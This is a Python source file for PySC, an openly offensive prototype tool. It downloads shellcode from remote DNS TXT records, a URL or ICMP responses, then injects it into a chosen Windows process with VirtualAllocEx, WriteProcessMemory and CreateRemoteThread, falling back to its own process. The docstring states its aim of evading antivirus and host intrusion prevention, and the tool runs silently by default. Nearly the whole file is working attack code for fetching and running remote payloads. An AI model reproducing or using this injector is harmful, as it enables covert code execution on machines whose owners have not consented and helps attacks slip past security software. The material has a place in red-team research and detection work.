# !/usr/bin/python
# -*- coding: utf-8 -*-

#

"""
    PySC expands on the numerous available tools and scripts to inject into a process on a
    running system.

    Aims of this project:

    - Remove shellcode from the script to help avoid detection by AV and HIPS systems
    - Offer a flexible command line based script
    - Also provide the ability to run fully automated, as an EXE (by using pyinstaller)

    To this end this prototype script offers the ability to download shellcode from a
    remote DNS server (using TXT records) or through Internet Explorer (using SSPI to
    utilize system-wide proxy settings and authorization tokens) and injects it into a
    specified process. If injection into the specified process is not possible, the script
    falls back to injecting into the current process.

    Module dependancies: none
"""

from sys import exit, argv
from string import split
from ctypes import *
from getopt import getopt
# import config and modules
from config import config
from modules import system_checks
from modules import get_process_id
from modules import dns_request
from modules import url_request
from modules import icmp_request

__author__ = 'Chris John Riley'
__credits__ = 'Too Many To List'
__license__ = 'GPL'
__version__ = '0.8'
__maintainer__ = 'Chris John Riley'
__email__ = 'contact@c22.cc'
__status__ = 'Prototype'
__date__ = '26 December 2013'


# further static configuration present in config/config.py

logo = \
    '''

                                           .d8888b.   .d8888b.
                      8888888b.           d88P  Y88b d88P  Y88b
                      888   Y88b          Y88b.      888    888
                      888    888           "Y888b.   888
                      888   d88P 888  888     "Y88b. 888
                      8888888P"  888  888       "888 888    888
                      888        888  888 Y88b  d88P Y88b  d88P
                      888        Y88b 888  "Y8888P"   "Y8888P"
                      888         "Y88888
                                      888     0101000001111001
                                 Y8b d88P       0101001101000011
                                  "Y88P"

                                      _/ PyShellcode (prototype)
                                               _/ ChrisJohnRiley
                                                  _/ blog.c22.cc
'''

usage = \
    '''Usage:

\t -h / --help    :: Display help (this!)
\t -d / --debug   :: Display debug messages
\t --sc           :: Shellcode to inject (in \\xXX notation)
\t --process      :: Target process.exe or PID
\t --dns          :: DNS to download b32 encoded shellcode (comma seperated)
\t --disable_dns  :: Disable DNS method
\t --dnsproto     :: Use either UDP or TCP (default to both)
\t --url          :: URL to download b32 encoded shellcode
\t --disable_url  :: Disable URL method
\t --icmp         :: IP address to use to request shellcode (Echo Request/Response)
\t --disable_icmp :: Disable ICMP method
\t --priority     :: Set priority to "dns", "url", or "icmp"
\t --nofallback   :: Disable fallback to injection in local process

Notes:

 PySC will by default run silent (no user feedback) to enable user
 feedback (error/status messages) please use debug mode (-d/--debug
 at command-line, or set debug = True in the script itself)

 Any command-line options passed to PySC at runtime override the
 hard-coded values within the script.

 To use PySC as a stand-alone executable, set the desired parameters
 in the script itself, and use pyinstaller to create an .exe
'''


def main():
    setup()
    sys_checks()
    config.shellcode = getsc()
    config.pid = getpid()
    inject()


def setup():

    # override any hard-coded variables based on command line parameters

    if len(argv) > 1:
        SHORTOPTS = 'hd'
        LONGOPTS = ([
                'help',
                'debug',
                'sc=',
                'process=',
                'dns=',
                'dnsproto=',
                'disable_dns',
                'url=',
                'disable_url',
                'icmp=',
                'disable_icmp',
                'priority=',
                'nofallback',
                ])
        try:
            (opts, args) = getopt(argv[1:], SHORTOPTS, LONGOPTS)
        except Exception, error:
            print logo
            print usage
            print ' [!] Error parsing input options ::: %s\n' % error
            exit(0)

        if config.header:
            print logo

        for (opt, arg) in opts:
            if opt in ('-h', '--help'):
                if not config.header:  # header not already displayed
                    print logo
                print usage
                exit(0)
            elif opt in ('-d', '--debug'):
                config.debug = True
                if not config.header:  # header not already displayed
                    print logo
            elif opt in '--sc':
                config.shellcode = arg.decode('string_escape')
                if config.debug:
                    print '\n [>] Using shellcode provided at command-line'
            elif opt in '--process':
                if arg.endswith('.exe'):
                    config.process = arg
                elif arg.isdigit():
                    config.pid = arg
                else:
                    if config.debug:
                        print '\n [!] please specify a valid .exe as process'
                    exit(1)
            elif opt in '--dns':
                config.dns = split(arg, ',')
            elif opt in '--dnsproto':
                if arg.lower() == 'tcp':
                    config.dnsproto["udp"] = False
                elif arg.lower() == 'udp':
                    config.dnsproto["tcp"] = False
                else:
                    if config.debug:
                        print '\n [!] Invalid DNS protocol specified'
            elif opt in '--url':
                if arg.startswith('http'):
                    config.url_target = arg
                else:
                    config.url_target = 'http://' + arg
            elif opt in '--icmp':
                config.icmp_target= arg
            elif opt in ('--disable_url', '--disable_dns', '--disable_icmp'):
                if opt in '--disable_url':
                    config.check["url"] = False
                elif opt in '--disable_dns':
                    config.check["dns"] = False
                elif opt in '--disable_icmp':
                    config.check["icmp"] = False
            elif opt in '--priority':
                if arg.lower() in ('dns', 'url', 'icmp'):
                    config.priority[arg.lower()] = 0
                else:
                    print '\n [!] Invalid priority value, ignoring'
            elif opt in '--nofallback':
                config.fallback = False


def sys_checks():

    # check platform and connection if shellcode not provided at
    # command-line or in config file

    system_checks.check_platform(config.debug)
    if not config.shellcode:
        # only check network if required to collect shellcode
        system_checks.check_network(config.debug)


def getsc():

    # perform requests in set order

    if not config.check["url"] and not config.check["dns"] and not \
        config.check["icmp"] and not config.shellcode:

        if config.debug:
            print ' [!] Must specify at least one source for shellcode'
        exit(1)
    if not config.shellcode:

        # sort based on priority and perform required actions

        config.priority = sorted(config.priority.items(), key=lambda x: x[1])
        for item in config.priority:
            if item[0] == 'url' and not config.shellcode:
                config.shellcode = urlhandler()
                if config.shellcode:
                    return config.shellcode
            elif item[0] == 'dns' and not config.shellcode:
                config.shellcode = dnshandler()
                if config.shellcode:
                    return config.shellcode
            elif item[0] == 'icmp' and not config.shellcode:
                config.shellcode = icmphandler()
                if config.shellcode:
                    return config.shellcode
            else:
                if config.debug:
                    print ' [!] Invalid option seen in priority list'
                exit(1)

       # final check that shellcode is set

        if not config.shellcode:
            if config.debug:
                print ' [!] No shellcode found with specified options'
            exit(1)

    else:

        # shellcode provided at command-line or in config

        return config.shellcode


def dnshandler():

    # handles dns requests

    if config.check["dns"]:

        # handle tcp and udp request types

        tcpres = []
        udpres = []
        result = ''

        if config.dnsproto['udp']:
            udpres = dns_request.dnsrequest('udp', config.dns, config.debug)
        if config.dnsproto['tcp']:
            tcpres = dns_request.dnsrequest('tcp', config.dns, config.debug)

        if tcpres == None: # prevent NoneType errors if array isn't filled
            config.dnsproto['tcp'] = False
        if udpres == None:
            config.dnsproto['udp'] = False

        if config.dnsproto['tcp'] and config.dnsproto['udp']:
            if udpres in tcpres:
                result = udpres
            else:
                result = tcpres
        elif config.dnsproto['tcp']:
            result = tcpres
        elif config.dnsproto['udp']:
            result = udpres

        return result


def urlhandler():

    # handles url requests

    if config.check["url"]:
        result = url_request.urlrequest(config.url_target,
                                                    config.url_sc_marker,
                                                    config.debug)
        return result


def icmphandler():

    # handles icmp requests

    if config.check["icmp"]:
        result = icmp_request.icmprequest(config.icmp_trigger,
                                                    config.icmp_target,
                                                    config.icmp_sc_marker,
                                                    config.debug)
        return result


def getpid():

    # get the pid of the desired process. Default to current process on failure

    if not config.pid:
        if config.process == 'SELF':
            config.pid = kernel32.GetCurrentProcessId()
            return config.pid
        else:
            try:
                procid = get_process_id.get_procid(config.process.lower())
                if procid:
                    config.pid = procid
                    if config.debug:
                        print ' [>] Process: %s has a PID number of %s' \
                            % (config.process, config.pid)
                    return config.pid
                if not procid:
                    if config.debug:
                        print ' [!] Process %s not found' % config.process
                    raise Exception
            except:
                if config.fallback:
                    config.pid = kernel32.GetCurrentProcessId()
                    if config.debug:
                        print ' [!] Cannot find pid of requested process, ' + \
                        'injecting into current PID'
                    return config.pid
                else:
                    if config.debug:
                        print ' [!] Cannot find pid of requested process'
                        print ' [!] Fallback disabled. Quitting'
                    exit(1)
    else:

        # pid set at command-line

        return config.pid

def inject():

    # inject shellcode into the desired target pid

    PAGE_EXECUTE_READWRITE = 0x00000040
    PROCESS_ALL_ACCESS = 0x000F0000 | 0x00100000 | 0xFFF
    VIRTUAL_MEM = 0x1000 | 0x2000

    sc_size = len(config.shellcode)

    # get a handle to the process we are injecting into

    hProcess = kernel32.OpenProcess(
                PROCESS_ALL_ACCESS,
                False,
                int(config.pid),
                )

    if not hProcess:
        if config.debug:
            print "\n [!] Couldn't acquire a handle to PID: %s" % config.pid

        # try to rescue the situation and inject into current process

        if config.fallback:
            try:
                if config.pid != kernel32.GetCurrentProcessId():
                    config.pid = kernel32.GetCurrentProcessId()
                    hProcess = kernel32.OpenProcess(
                                PROCESS_ALL_ACCESS,
                                False,
                                int(config.pid),
                                )
                    if config.debug:
                        print ' [>] Fallback: Injecting into current PID (%s)' \
                            % config.pid
                else:

                    # already failed to get handle to self

                    raise Exception
            except:

                # terminal error

                if config.debug:
                    print '\n [!] Unrecoverable error'
                exit(1)
        else:
            if config.debug:
                print ' [!] Fallback disabled: Cannot gain handle to ' + \
                    'desired process'
            exit(1)
    else:
        if config.debug:
            print '\n [>] Acquired a handle to PID: %s' % config.pid

    # allocate some space for the shellcode (in the program memory)

    hAlloc = kernel32.VirtualAllocEx(
                hProcess,
                False,
                sc_size,
                VIRTUAL_MEM,
                PAGE_EXECUTE_READWRITE,
                )

    if not hAlloc:
        if config.debug:
            print ' [!] Allocation failed. Exiting.'
        exit(1)

    # write out the shellcode

    written = c_int(0)
    hWrite = kernel32.WriteProcessMemory(
                hProcess,
                hAlloc,
                config.shellcode,
                sc_size,
                byref(written),
                )

    if not hWrite:
        if config.debug:
            print ' [!] Write process failed. Exiting.'
        exit(1)

    # now we create the remote thread and point its entry
    # routine to be head of our shellcode

    thread_id = c_ulong(0)
    hCreate = kernel32.CreateRemoteThread(
                hProcess,
                None,
                False,
                hAlloc,
                None,
                False,
                byref(thread_id),
                )
    if hCreate:
        if config.debug:
            print ' [>] Injection complete. Exiting.'
        exit(0)
    else:
        if config.pid != kernel32.GetCurrentProcessId() and config.fallback:
            if config.debug:
                print ' [!] Failed to inject shellcode. Defaulting to ' + \
                    'current process.'
            config.pid = kernel32.GetCurrentProcessId()
            inject(config.shellcode, config.pid)
        else:
            if config.debug:
                print ' [!] Failed to inject shellcode. Exiting.'
            exit(1)


if __name__ == '__main__':
    main()
